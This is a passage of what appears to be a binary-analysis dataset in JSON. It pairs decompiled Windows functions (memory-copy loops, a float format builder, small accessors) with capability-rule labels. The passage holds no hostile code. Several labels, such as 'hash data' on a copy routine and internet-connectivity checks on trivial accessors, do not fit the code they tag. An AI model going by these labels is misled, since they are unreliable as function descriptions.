uVar6;\n                    } while (0x2f < param_3);\n                    puVar36 = iVar35 + 0x34;\n                }\n                else {\n                    iVar32 = param_2 + -0xc;\n                    uVar42 = *param_2;\n                    do {\n                        iVar35 = iVar32;\n                        uVar44 = *(iVar35 + 0x20);\n                        uVar4 = *(iVar35 + 0x24);\n                        uVar5 = *(iVar35 + 0x28);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(iVar35 + 0x10);\n                        uVar43 = *(iVar35 + 0x3c);\n                        auVar3 = *(iVar35 + 0x20);\n                        *(param_1 + 0xc) = uVar42;\n                        *(param_1 + 2) = uVar44;\n                        *(param_1 + 0x14) = uVar4;\n                        *(param_1 + 3) = uVar5;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x60, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x60, 0);\n                        param_1 = param_1 + 6;\n                        iVar32 = iVar35 + 0x30;\n                        uVar42 = uVar43;\n                    } while (0x2f < param_3);\n                    puVar36 = iVar35 + 0x3c;\n                }\n                for (; 0xf < param_3; param_3 = param_3 - 0x10) {\n                    uVar42 = *puVar36;\n                    uVar43 = *(puVar36 + 4);\n                    uVar44 = *(puVar36 + 1);\n                    uVar4 = *(puVar36 + 0xc);\n                    puVar36 = puVar36 + 2;\n                    *param_1 = uVar42;\n                    *(param_1 + 4) = uVar43;\n                    *(param_1 + 1) = uVar44;\n                    *(param_1 + 0xc) = uVar4;\n                    param_1 = param_1 + 2;\n                }\n                if ((param_3 >> 2 & 1) != 0) {\n                    uVar42 = *puVar36;\n                    param_3 = param_3 - 4;\n                    puVar36 = puVar36 + 4;\n                    *param_1 = uVar42;\n                    param_1 = param_1 + 4;\n                }\n                if ((param_3 >> 3 & 1) != 0) {\n                    param_3 = param_3 - 8;\n                    *param_1 = *puVar36;\n                }\n    // WARNING: Could not recover jumptable at 0x00483a45. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (4 cases) at 0x483a84\n                uVar45 = (**(param_3 * 4 + 0x483a84))();\n                return uVar45;\n            }\n        }\n        uVar33 = param_3;\n        if (0x1f < param_3) {\n            for (uVar33 = param_3 >> 2; uVar33 != 0; uVar33 = uVar33 - 1) {\n                *puVar39 = *param_2;\n                param_2 = param_2 + 4;\n                puVar39 = puVar39 + 4;\n            }\n    // switch table (4 cases) at 0x483a84\n            switch(param_3 & 3) {\n            case 0:\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 1:\n                *puVar39 = *param_2;\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 2:\n                *puVar39 = *param_2;\n                *(puVar39 + 1) = *(param_2 + 1);\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 3:\n                *puVar39 = *param_2;\n                *(puVar39 + 1) = *(param_2 + 1);\n                *(puVar39 + 2) = *(param_2 + 2);\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            }\n        }\n    }\ncode_r0x00483d1b:\n    if ((uVar33 & 0x1f) != 0) {\n        for (uVar34 = (uVar33 & 0x1f) >> 2; uVar34 != 0; uVar34 = uVar34 - 1) {\n            param_3 = *param_2;\n            *puVar39 = param_3;\n            puVar39 = puVar39 + 4;\n            param_2 = param_2 + 4;\n        }\n        for (uVar33 = uVar33 & 3; uVar33 != 0; uVar33 = uVar33 - 1) {\n            *puVar39 = *param_2;\n            param_2 = param_2 + 1;\n            puVar39 = puVar39 + 1;\n        }\n    }\ncode_r0x00483d50:\n    return CONCAT44(param_3, param_1);\n}\n",
        "token_count": 6184
    },
    "004058f3": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint64_t fcn.004058f3(ulong *param_1, ulong *param_2, uint32_t param_3)\n\n{\n    ulong uVar1;\n    uchar auVar2 [32];\n    uchar auVar3 [32];\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uint uVar30;\n    uint uVar31;\n    int32_t iVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    int32_t iVar35;\n    ulong *puVar36;\n    uint *puVar37;\n    uint *puVar38;\n    ulong *puVar39;\n    uint *puVar40;\n    uint *puVar41;\n    uint uVar42;\n    uint uVar43;\n    uint uVar44;\n    uint64_t uVar45;\n    \n    if ((param_2 < param_1) && (param_1 < param_3 + param_2)) {\n        puVar37 = param_2 + param_3;\n        puVar40 = param_1 + param_3;\n        uVar33 = param_3;\n        if (0x1f < param_3) {\n            if ((*0x56cc9c >> 1 & 1) == 0) {\n                if ((puVar40 & 3) != 0) {\n                    uVar33 = puVar40 & 3;\n                    param_3 = param_3 - uVar33;\n                    do {\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        puVar37 = puVar37 + -1;\n                        puVar40 = puVar40 - 1;\n                        uVar33 = uVar33 - 1;\n                    } while (uVar33 != 0);\n                }\n                if (0x1f < param_3) {\n                    uVar33 = param_3 >> 2;\n                    while( true ) {\n                        if (uVar33 == 0) break;\n                        uVar33 = uVar33 - 1;\n                        puVar40[-1] = puVar37[-1];\n                        puVar37 = puVar37 + -1;\n                        puVar40 = puVar40 + -1;\n                    }\n    // switch table (4 cases) at 0x484310\n                    switch(param_3 & 3) {\n                    case 0:\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 1:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 2:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        *(puVar40 - 2) = *(puVar37 + -2);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    case 3:\n                        *(puVar40 - 1) = *(puVar37 + -1);\n                        *(puVar40 - 2) = *(puVar37 + -2);\n                        *(puVar40 - 3) = *(puVar37 + -3);\n                        return CONCAT44(param_3, param_1) & 0x3ffffffff;\n                    }\n                }\n            }\n            else {\n                while (puVar38 = puVar37,  puVar41 = puVar40,  (puVar40 & 0xf) != 0) {\n                    puVar37 = puVar37 + -1;\n                    puVar40 = puVar40 + -1;\n                    *puVar40 = *puVar37;\n                    param_3 = param_3 - 1;\n                }\n                do {\n                    puVar37 = puVar38;\n                    puVar40 = puVar41;\n                    if (param_3 < 0x80) break;\n                    puVar37 = puVar38 + -0x20;\n                    puVar40 = puVar41 + -0x20;\n                    uVar42 = puVar38[-0x1f];\n                    uVar43 = puVar38[-0x1e];\n                    uVar44 = puVar38[-0x1d];\n                    uVar4 = puVar38[-0x1c];\n                    uVar5 = puVar38[-0x1b];\n                    uVar6 = puVar38[-0x1a];\n                    uVar7 = puVar38[-0x19];\n                    uVar8 = puVar38[-0x18];\n                    uVar9 = puVar38[-0x17];\n                    uVar10 = puVar38[-0x16];\n                    uVar11 = puVar38[-0x15];\n                    uVar12 = puVar38[-0x14];\n                    uVar13 = puVar38[-0x13];\n                    uVar14 = puVar38[-0x12];\n                    uVar15 = puVar38[-0x11];\n                    uVar16 = puVar38[-0x10];\n                    uVar17 = puVar38[-0xf];\n                    uVar18 = puVar38[-0xe];\n                    uVar19 = puVar38[-0xd];\n                    uVar20 = puVar38[-0xc];\n                    uVar21 = puVar38[-0xb];\n                    uVar22 = puVar38[-10];\n                    uVar23 = puVar38[-9];\n                    uVar24 = puVar38[-8];\n                    uVar25 = puVar38[-7];\n                    uVar26 = puVar38[-6];\n                    uVar27 = puVar38[-5];\n                    uVar28 = puVar38[-4];\n                    uVar29 = puVar38[-3];\n                    uVar30 = puVar38[-2];\n                    uVar31 = puVar38[-1];\n                    *puVar40 = *puVar37;\n                    puVar41[-0x1f] = uVar42;\n                    puVar41[-0x1e] = uVar43;\n                    puVar41[-0x1d] = uVar44;\n                    puVar41[-0x1c] = uVar4;\n                    puVar41[-0x1b] = uVar5;\n                    puVar41[-0x1a] = uVar6;\n                    puVar41[-0x19] = uVar7;\n                    puVar41[-0x18] = uVar8;\n                    puVar41[-0x17] = uVar9;\n                    puVar41[-0x16] = uVar10;\n                    puVar41[-0x15] = uVar11;\n                    puVar41[-0x14] = uVar12;\n                    puVar41[-0x13] = uVar13;\n                    puVar41[-0x12] = uVar14;\n                    puVar41[-0x11] = uVar15;\n                    puVar41[-0x10] = uVar16;\n                    puVar41[-0xf] = uVar17;\n                    puVar41[-0xe] = uVar18;\n                    puVar41[-0xd] = uVar19;\n                    puVar41[-0xc] = uVar20;\n                    puVar41[-0xb] = uVar21;\n                    puVar41[-10] = uVar22;\n                    puVar41[-9] = uVar23;\n                    puVar41[-8] = uVar24;\n                    puVar41[-7] = uVar25;\n                    puVar41[-6] = uVar26;\n                    puVar41[-5] = uVar27;\n                    puVar41[-4] = uVar28;\n                    puVar41[-3] = uVar29;\n                    puVar41[-2] = uVar30;\n                    puVar41[-1] = uVar31;\n                    param_3 = param_3 - 0x80;\n                    puVar38 = puVar37;\n                    puVar41 = puVar40;\n                } while ((param_3 & 0xffffff80) != 0);\n                puVar38 = puVar37;\n                puVar41 = puVar40;\n                if (0x1f < param_3) {\n                    do {\n                        puVar37 = puVar38 + -8;\n                        puVar40 = puVar41 + -8;\n                        uVar42 = puVar38[-7];\n                        uVar43 = puVar38[-6];\n                        uVar44 = puVar38[-5];\n                        uVar4 = puVar38[-4];\n                        uVar5 = puVar38[-3];\n                        uVar6 = puVar38[-2];\n                        uVar7 = puVar38[-1];\n                        *puVar40 = *puVar37;\n                        puVar41[-7] = uVar42;\n                        puVar41[-6] = uVar43;\n                        puVar41[-5] = uVar44;\n                        puVar41[-4] = uVar4;\n                        puVar41[-3] = uVar5;\n                        puVar41[-2] = uVar6;\n                        puVar41[-1] = uVar7;\n                        param_3 = param_3 - 0x20;\n                        puVar38 = puVar37;\n                        puVar41 = puVar40;\n                    } while ((param_3 & 0xffffffe0) != 0);\n                }\n            }\n        }\n        for (; (param_3 & 0xfffffffc) != 0; param_3 = param_3 - 4) {\n            puVar40 = puVar40 + -1;\n            puVar37 = puVar37 + -1;\n            *puVar40 = *puVar37;\n        }\n        for (; param_3 != 0; param_3 = param_3 - 1) {\n            puVar40 = puVar40 - 1;\n            puVar37 = puVar37 + -1;\n            *puVar40 = *puVar37;\n        }\n        return CONCAT44(uVar33, param_1);\n    }\n    uVar33 = param_3;\n    puVar39 = param_1;\n    if (0x1f < param_3) {\n        if (param_3 < 0x80) {\n            if ((*0x56cc9c >> 1 & 1) != 0) {\ncode_r0x004844cd:\n                if (uVar33 == 0) goto code_r0x00484530;\n                for (param_3 = uVar33 >> 5; param_3 != 0; param_3 = param_3 - 1) {\n                    uVar42 = *(param_2 + 4);\n                    uVar43 = *(param_2 + 1);\n                    uVar44 = *(param_2 + 0xc);\n                    uVar4 = *(param_2 + 2);\n                    uVar5 = *(param_2 + 0x14);\n                    uVar6 = *(param_2 + 3);\n                    uVar7 = *(param_2 + 0x1c);\n                    *puVar39 = *param_2;\n                    *(puVar39 + 4) = uVar42;\n                    *(puVar39 + 1) = uVar43;\n                    *(puVar39 + 0xc) = uVar44;\n                    *(puVar39 + 2) = uVar4;\n                    *(puVar39 + 0x14) = uVar5;\n                    *(puVar39 + 3) = uVar6;\n                    *(puVar39 + 0x1c) = uVar7;\n                    param_2 = param_2 + 4;\n                    puVar39 = puVar39 + 4;\n                }\n                goto code_r0x004844fb;\n            }\ncode_r0x00484227:\n            uVar33 = param_1 & 3;\n            while (uVar33 != 0) {\n                *puVar39 = *param_2;\n                param_3 = param_3 - 1;\n                param_2 = param_2 + 1;\n                puVar39 = puVar39 + 1;\n                uVar33 = puVar39 & 3;\n            }\n        }\n        else {\n            if ((*0x56ec50 >> 1 & 1) != 0) {\n                for (; uVar33 != 0; uVar33 = uVar33 - 1) {\n                    *puVar39 = *param_2;\n                    param_2 = param_2 + 1;\n                    puVar39 = puVar39 + 1;\n                }\n                return CONCAT44(param_3, param_1);\n            }\n            if ((((param_1 ^ param_2) & 0xf) == 0) && ((*0x56cc9c >> 1 & 1) != 0)) {\n                if ((param_2 & 0xf) != 0) {\n                    uVar34 = 0x10 - (param_2 & 0xf);\n                    param_3 = param_3 - uVar34;\n                    for (uVar33 = uVar34 & 3; uVar33 != 0; uVar33 = uVar33 - 1) {\n                        *puVar39 = *param_2;\n                        param_2 = param_2 + 1;\n                        puVar39 = puVar39 + 1;\n                    }\n                    for (uVar34 = uVar34 >> 2; uVar34 != 0; uVar34 = uVar34 - 1) {\n                        *puVar39 = *param_2;\n                        param_2 = param_2 + 4;\n                        puVar39 = puVar39 + 4;\n                    }\n                }\n                uVar33 = param_3 & 0x7f;\n                for (param_3 = param_3 >> 7; param_3 != 0; param_3 = param_3 - 1) {\n                    uVar42 = *(param_2 + 4);\n                    uVar43 = *(param_2 + 1);\n                    uVar44 = *(param_2 + 0xc);\n                    uVar4 = *(param_2 + 2);\n                    uVar5 = *(param_2 + 0x14);\n                    uVar6 = *(param_2 + 3);\n                    uVar7 = *(param_2 + 0x1c);\n                    uVar8 = *(param_2 + 4);\n                    uVar9 = *(param_2 + 0x24);\n                    uVar10 = *(param_2 + 5);\n                    uVar11 = *(param_2 + 0x2c);\n                    uVar12 = *(param_2 + 6);\n                    uVar13 = *(param_2 + 0x34);\n                    uVar14 = *(param_2 + 7);\n                    uVar15 = *(param_2 + 0x3c);\n                    *puVar39 = *param_2;\n                    *(puVar39 + 4) = uVar42;\n                    *(puVar39 + 1) = uVar43;\n                    *(puVar39 + 0xc) = uVar44;\n                    *(puVar39 + 2) = uVar4;\n                    *(puVar39 + 0x14) = uVar5;\n                    *(puVar39 + 3) = uVar6;\n                    *(puVar39 + 0x1c) = uVar7;\n                    *(puVar39 + 4) = uVar8;\n                    *(puVar39 + 0x24) = uVar9;\n                    *(puVar39 + 5) = uVar10;\n                    *(puVar39 + 0x2c) = uVar11;\n                    *(puVar39 + 6) = uVar12;\n                    *(puVar39 + 0x34) = uVar13;\n                    *(puVar39 + 7) = uVar14;\n                    *(puVar39 + 0x3c) = uVar15;\n                    uVar42 = *(param_2 + 0x44);\n                    uVar43 = *(param_2 + 9);\n                    uVar44 = *(param_2 + 0x4c);\n                    uVar4 = *(param_2 + 10);\n                    uVar5 = *(param_2 + 0x54);\n                    uVar6 = *(param_2 + 0xb);\n                    uVar7 = *(param_2 + 0x5c);\n                    uVar8 = *(param_2 + 0xc);\n                    uVar9 = *(param_2 + 100);\n                    uVar10 = *(param_2 + 0xd);\n                    uVar11 = *(param_2 + 0x6c);\n                    uVar12 = *(param_2 + 0xe);\n                    uVar13 = *(param_2 + 0x74);\n                    uVar14 = *(param_2 + 0xf);\n                    uVar15 = *(param_2 + 0x7c);\n                    *(puVar39 + 8) = *(param_2 + 8);\n                    *(puVar39 + 0x44) = uVar42;\n                    *(puVar39 + 9) = uVar43;\n                    *(puVar39 + 0x4c) = uVar44;\n                    *(puVar39 + 10) = uVar4;\n                    *(puVar39 + 0x54) = uVar5;\n                    *(puVar39 + 0xb) = uVar6;\n                    *(puVar39 + 0x5c) = uVar7;\n                    *(puVar39 + 0xc) = uVar8;\n                    *(puVar39 + 100) = uVar9;\n                    *(puVar39 + 0xd) = uVar10;\n                    *(puVar39 + 0x6c) = uVar11;\n                    *(puVar39 + 0xe) = uVar12;\n                    *(puVar39 + 0x74) = uVar13;\n                    *(puVar39 + 0xf) = uVar14;\n                    *(puVar39 + 0x7c) = uVar15;\n                    param_2 = param_2 + 0x10;\n                    puVar39 = puVar39 + 0x10;\n                }\n                goto code_r0x004844cd;\n            }\n            if (((*0x56ec50 & 1) == 0) || ((param_1 & 3) != 0)) goto code_r0x00484227;\n            if ((param_2 & 3) == 0) {\n                if ((param_1 >> 2 & 1) != 0) {\n                    uVar42 = *param_2;\n                    param_3 = param_3 - 4;\n                    param_2 = param_2 + 4;\n                    *param_1 = uVar42;\n                    param_1 = param_1 + 4;\n                }\n                if ((param_1 >> 3 & 1) != 0) {\n                    uVar1 = *param_2;\n                    param_3 = param_3 - 8;\n                    param_2 = param_2 + 1;\n                    *param_1 = uVar1;\n                    param_1 = param_1 + 1;\n                }\n                if ((param_2 & 7) == 0) {\n                    puVar39 = param_2 + -1;\n                    uVar42 = *param_2;\n                    uVar43 = *(param_2 + 4);\n                    do {\n                        puVar36 = puVar39;\n                        uVar5 = *(puVar36 + 4);\n                        uVar6 = *(puVar36 + 0x24);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(puVar36 + 2);\n                        uVar44 = *(puVar36 + 7);\n                        uVar4 = *(puVar36 + 0x3c);\n                        auVar3 = *(puVar36 + 4);\n                        *(param_1 + 1) = uVar42;\n                        *(param_1 + 0xc) = uVar43;\n                        *(param_1 + 2) = uVar5;\n                        *(param_1 + 0x14) = uVar6;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x40, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x40, 0);\n                        param_1 = param_1 + 6;\n                        puVar39 = puVar36 + 6;\n                        uVar42 = uVar44;\n                        uVar43 = uVar4;\n                    } while (0x2f < param_3);\n                    puVar36 = puVar36 + 7;\n                }\n                else if ((param_2 >> 3 & 1) == 0) {\n                    iVar32 = param_2 + -4;\n                    uVar42 = *param_2;\n                    uVar43 = *(param_2 + 4);\n                    uVar44 = *(param_2 + 1);\n                    do {\n                        iVar35 = iVar32;\n                        uVar7 = *(iVar35 + 0x20);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(iVar35 + 0x10);\n                        uVar4 = *(iVar35 + 0x34);\n                        uVar5 = *(iVar35 + 0x38);\n                        uVar6 = *(iVar35 + 0x3c);\n                        auVar3 = *(iVar35 + 0x20);\n                        *(param_1 + 4) = uVar42;\n                        *(param_1 + 1) = uVar43;\n                        *(param_1 + 0xc) = uVar44;\n                        *(param_1 + 2) = uVar7;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x20, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x20, 0);\n                        param_1 = param_1 + 6;\n                        iVar32 = iVar35 + 0x30;\n                        uVar42 = uVar4;\n                        uVar43 = uVar5;\n                        uVar44 = uVar6;\n                    } while (0x2f < param_3);\n                    puVar36 = iVar35 + 0x34;\n                }\n                else {\n                    iVar32 = param_2 + -0xc;\n                    uVar42 = *param_2;\n                    do {\n                        iVar35 = iVar32;\n                        uVar44 = *(iVar35 + 0x20);\n                        uVar4 = *(iVar35 + 0x24);\n                        uVar5 = *(iVar35 + 0x28);\n                        param_3 = param_3 - 0x30;\n                        auVar2 = *(iVar35 + 0x10);\n                        uVar43 = *(iVar35 + 0x3c);\n                        auVar3 = *(iVar35 + 0x20);\n                        *(param_1 + 0xc) = uVar42;\n                        *(param_1 + 2) = uVar44;\n                        *(param_1 + 0x14) = uVar4;\n                        *(param_1 + 3) = uVar5;\n                        *(param_1 + 2) = SUB3216(auVar2 >> 0x60, 0);\n                        *(param_1 + 4) = SUB3216(auVar3 >> 0x60, 0);\n                        param_1 = param_1 + 6;\n                        iVar32 = iVar35 + 0x30;\n                        uVar42 = uVar43;\n                    } while (0x2f < param_3);\n                    puVar36 = iVar35 + 0x3c;\n                }\n                for (; 0xf < param_3; param_3 = param_3 - 0x10) {\n                    uVar42 = *puVar36;\n                    uVar43 = *(puVar36 + 4);\n                    uVar44 = *(puVar36 + 1);\n                    uVar4 = *(puVar36 + 0xc);\n                    puVar36 = puVar36 + 2;\n                    *param_1 = uVar42;\n                    *(param_1 + 4) = uVar43;\n                    *(param_1 + 1) = uVar44;\n                    *(param_1 + 0xc) = uVar4;\n                    param_1 = param_1 + 2;\n                }\n                if ((param_3 >> 2 & 1) != 0) {\n                    uVar42 = *puVar36;\n                    param_3 = param_3 - 4;\n                    puVar36 = puVar36 + 4;\n                    *param_1 = uVar42;\n                    param_1 = param_1 + 4;\n                }\n                if ((param_3 >> 3 & 1) != 0) {\n                    param_3 = param_3 - 8;\n                    *param_1 = *puVar36;\n                }\n    // WARNING: Could not recover jumptable at 0x00484225. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (4 cases) at 0x484264\n                uVar45 = (**(param_3 * 4 + 0x484264))();\n                return uVar45;\n            }\n        }\n        uVar33 = param_3;\n        if (0x1f < param_3) {\n            for (uVar33 = param_3 >> 2; uVar33 != 0; uVar33 = uVar33 - 1) {\n                *puVar39 = *param_2;\n                param_2 = param_2 + 4;\n                puVar39 = puVar39 + 4;\n            }\n    // switch table (4 cases) at 0x484264\n            switch(param_3 & 3) {\n            case 0:\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 1:\n                *puVar39 = *param_2;\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 2:\n                *puVar39 = *param_2;\n                *(puVar39 + 1) = *(param_2 + 1);\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            case 3:\n                *puVar39 = *param_2;\n                *(puVar39 + 1) = *(param_2 + 1);\n                *(puVar39 + 2) = *(param_2 + 2);\n                return CONCAT44(param_3, param_1) & 0x3ffffffff;\n            }\n        }\n    }\ncode_r0x004844fb:\n    if ((uVar33 & 0x1f) != 0) {\n        for (uVar34 = (uVar33 & 0x1f) >> 2; uVar34 != 0; uVar34 = uVar34 - 1) {\n            param_3 = *param_2;\n            *puVar39 = param_3;\n            puVar39 = puVar39 + 4;\n            param_2 = param_2 + 4;\n        }\n        for (uVar33 = uVar33 & 3; uVar33 != 0; uVar33 = uVar33 - 1) {\n            *puVar39 = *param_2;\n            param_2 = param_2 + 1;\n            puVar39 = puVar39 + 1;\n        }\n    }\ncode_r0x00484530:\n    return CONCAT44(param_3, param_1);\n}\n",
        "token_count": 6171
    },
    "0041a400": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __thiscall fcn.0041a400(uint param_1, uint param_2, ulong param_3, int32_t param_4, uint param_5, uint64_t param_6)\n\n{\n    uchar *puVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    uint uVar4;\n    uchar uVar5;\n    int32_t iVar6;\n    uint ****ppppuVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t **in_FS_OFFSET;\n    uchar uStack68;\n    uchar uStack67;\n    ushort uStack66;\n    uchar auStack64 [4];\n    int32_t iStack60;\n    uint ****appppuStack56 [4];\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = &stack0xffffff8c;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e430;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack40 = 0;\n    uStack36 = 0xf;\n    appppuStack56[0] = NULL;\n    uVar2 = *(param_4 + 0x14) & 0x3000;\n    if (uVar2 == 0x3000) {\n        uVar10 = 0xffffffff;\n        uVar9 = 0xd;\n    }\n    else {\n        uVar10 = *(param_4 + 0x18);\n        uVar8 = *(param_4 + 0x1c);\n        uVar9 = uVar10;\n        if ((SBORROW4(uVar8, uVar10 == 0) != false) != uVar8 - (uVar10 == 0) < 0) {\n            if ((uVar8 | uVar10) == 0) {\n                uVar10 = 0;\n                uVar9 = uVar2 == 0;\n            }\n            else {\n                uVar9 = 6;\n            }\n        }\n    }\n    puVar1 = &stack0xffffff8c;\n    if ((uVar2 == 0x2000) && (puVar1 = &stack0xffffff8c,  *0x4ea4f8 < (*0x4ea4e0 & param_6))) {\n        fcn.00405c77(param_6, param_6 >> 0x20, &iStack60);\n        iVar6 = -iStack60;\n        if (0 < iStack60) {\n            iVar6 = iStack60;\n        }\n        uVar9 = uVar9 + (iVar6 * 0x7597 >> 5) / 0xc35;\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    uVar2 = uVar9 + 0x32;\n    if (uVar2 == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n        appppuStack56[0]._0_1_ = 0;\n        uStack40 = uVar2;\n    }\n    else if (uVar2 < 0x10) {\n        uStack40 = uVar2;\n        fcn.0040314d();\n        (&stack0xfffffffa)[uVar9] = 0;\n    }\n    else {\n        uStack20 = 1;\n        fcn.00401ec9();\n    }\n    uVar2 = *(param_4 + 0x14);\n    uStack68 = 0x25;\n    if ((uVar2 & 0x20) == 0) {\n        puVar3 = &uStack67;\n    }\n    else {\n        puVar3 = &uStack66;\n        uStack67 = 0x2b;\n    }\n    if ((uVar2 & 0x10) != 0) {\n        *puVar3 = 0x23;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0x2a2e;\n    uVar8 = uVar2 & 0x3000;\n    if ((uVar2 & 4) == 0) {\n        if (uVar8 == 0x1000) {\n            uVar5 = 0x65;\n            goto code_r0x0041a60a;\n        }\n        if (uVar8 != 0x2000) {\n            if (uVar8 == 0x3000) {\n                uVar5 = 0x61;\n            }\n            else {\n                uVar5 = 0x67;\n            }\n            goto code_r0x0041a60a;\n        }\n    }\n    else {\n        if (uVar8 == 0x1000) {\n            uVar5 = 0x45;\n            goto code_r0x0041a60a;\n        }\n        if (uVar8 != 0x2000) {\n            if (uVar8 == 0x3000) {\n                uVar5 = 0x41;\n            }\n            else {\n                uVar5 = 0x47;\n            }\n            goto code_r0x0041a60a;\n        }\n    }\n    uVar5 = 0x66;\ncode_r0x0041a60a:\n    *(puVar3 + 1) = uVar5;\n    *(puVar3 + 3) = 0;\n    ppppuVar7 = appppuStack56[0];\n    if (uStack36 < 0x10) {\n        ppppuVar7 = appppuStack56;\n    }\n    uStack20 = 1;\n    fcn.004054ed(ppppuVar7, uStack40, &uStack68, uVar10);\n    fcn.004037dd(param_1, param_2, param_3);\n    if (0xf < uStack36) {\n        ppppuVar7 = appppuStack56[0];\n        if ((0xfff < uStack36 + 1) && (ppppuVar7 = appppuStack56[0][-1],  0x1f < appppuStack56[0] + (-4 - ppppuVar7))) {\n            uStack20 = 0;\n            fcn.004047f5();\n            fcn.004052d1();\n            uVar4 = fcn.00403a76();\n            return uVar4;\n        }\n        fcn.00401a32(ppppuVar7);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_2;\n}\n",
        "token_count": 1499
    },
    "00401014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401014(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        uVar3 = *(*(in_ECX + 0x14) + -8);\n        arg_8h[1] = *(*(in_ECX + 0x14) + -4);\n        *arg_8h = uVar3;\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405eed(in_ECX + 0x464 + uVar1 * 0x10, 4, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        puVar2 = *(in_ECX + 0x46c + uVar1 * 0x10);\n        uVar3 = puVar2[1];\n        *arg_8h = *puVar2;\n        arg_8h[1] = uVar3;\n    }\n    return 1;\n}\n",
        "token_count": 363
    },
    "00401028": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401028(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if ((*(param_1 + 0x45c) == 2) && (*(param_1 + 0x458) == 1)) {\n        if (99 < *(param_1 + 0xaa8)) {\n            puVar1 = fcn.004039a4();\n            *puVar1 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        uVar2 = fcn.0040288d(param_1 + 0x464 + *(param_1 + 0xaa8) * 0x10, 4, *(param_1 + 0x31), *(param_1 + 0x2c));\n        return uVar2;\n    }\n    return 1;\n}\n",
        "token_count": 196
    },
    "0040105f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
